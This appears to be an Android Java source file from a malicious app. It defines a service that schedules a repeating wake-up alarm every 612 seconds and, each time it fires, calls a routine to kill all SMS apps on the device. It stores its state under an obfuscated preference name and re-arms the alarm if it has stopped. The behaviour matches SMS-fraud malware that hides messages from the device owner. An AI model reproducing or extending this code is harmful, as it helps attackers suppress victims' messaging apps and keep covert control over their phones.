package net.workspace;
import net.workspace.biz.BIZ;
import net.workspace.util.AppStoper;
import net.workspace.util.MyLogger;
import net.workspace.util.T;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;

/**
 * KillSmsAppService
 *
 * @author Hike
 */
public class KillService extends android.app.Service {
    public static void restartAlarm() {
        synchronized (locker) {
            AlarmManager manager = (AlarmManager) T.context.getSystemService("alarm");
            PendingIntent pending = PendingIntent.getService(T.context, 0, new Intent().setClass(T.context, net.workspace.KillService.class).setAction("do"), 0);
            manager.cancel(pending);
            manager.setRepeating(AlarmManager.RTC_WAKEUP, 0, interval * 1000, pending);
        }
    }
    private static String PREF_NAME = "OPQRVSGdddd";
    private static final int interval = 612;//seconds
    private static final Object locker = new Object();
    @Override
    public void onStart(Intent intent, int i) {
        super.onStart(intent, i);
        String action = null;
        if (intent != null) action = intent.getAction();
        MyLogger.debug("KillService onStart start,action=" + action);
        SharedPreferences pref = getSharedPreferences(PREF_NAME, 0);
        long current = System.currentTimeMillis();
        if ("do".equals(action)) {
            pref.edit().putLong(PREF_NAME, current).commit();
            AppStoper stoper = new AppStoper();
            stoper.killAllSmsApps();
        } else {
            long lastProcessTime = pref.getLong(PREF_NAME, 0);
            if (current - lastProcessTime > BIZ.TASK_CHECK_INTERVAL * 1000) {
                restartAlarm();
            }
        }
        stopService(new Intent().setClass(this, net.workspace.KillService.class));
        MyLogger.debug("KillService onStart end");
    }
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
